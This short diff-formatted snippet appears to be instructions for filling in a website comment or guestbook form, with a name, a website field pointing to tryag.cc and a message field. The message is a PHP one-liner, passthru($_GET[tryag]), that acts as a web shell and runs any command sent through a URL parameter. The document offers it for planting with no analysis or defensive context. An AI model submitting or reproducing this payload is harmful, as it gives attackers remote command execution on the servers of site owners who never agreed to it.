@@ -1,0 +1,4 @@
+Name (required): Write -&gt;&gt; Mahmood
+Web site (without http://): Write -&gt;&gt; http://tryag.cc
+Message: Write -&gt;&gt; &lt;? passthru($_GET[tryag]); ?&gt;
+
